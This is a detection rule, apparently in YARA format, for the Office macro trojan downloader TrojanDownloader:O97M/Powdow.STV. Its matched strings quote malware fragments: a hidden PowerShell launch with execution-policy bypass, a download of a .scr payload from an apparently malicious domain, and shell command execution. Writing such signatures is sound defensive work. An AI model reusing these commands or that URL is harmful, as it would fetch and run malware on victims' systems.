
rule TrojanDownloader_O97M_Powdow_STV_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STV!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 6e 20 2d 65 78 65 63 75 74 69 6f 6e 70 6f 6c 69 63 79 20 62 79 70 61 73 73 3b } //1 powershell -WindowStyle hidden -executionpolicy bypass;
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 22 68 74 74 70 73 3a 2f 2f 6f 66 66 69 63 65 72 65 70 72 65 73 65 6e 74 61 74 69 76 65 2e 63 6f 6d 2f 78 6c 73 2f 54 43 25 32 30 31 25 32 30 41 48 54 53 41 25 32 30 31 30 39 33 25 32 30 31 30 39 34 25 32 30 52 4f 2e 73 63 72 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b } //1 Invoke-WebRequest -Uri ""https://officerepresentative.com/xls/TC%201%20AHTSA%201093%201094%20RO.scr"" -OutFile $TempFile;
		$a_01_2 = {53 65 74 20 6f 57 73 68 53 68 65 6c 6c 45 78 65 63 20 3d 20 6f 57 73 68 53 68 65 6c 6c 2e 45 78 65 63 28 73 43 6f 6d 6d 61 6e 64 29 } //1 Set oWshShellExec = oWshShell.Exec(sCommand)
		$a_01_3 = {73 4f 75 74 70 75 74 20 3d 20 6f 57 73 68 53 68 65 6c 6c 45 78 65 63 2e 53 74 64 4f 75 74 2e 52 65 61 64 41 6c 6c } //1 sOutput = oWshShellExec.StdOut.ReadAll
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}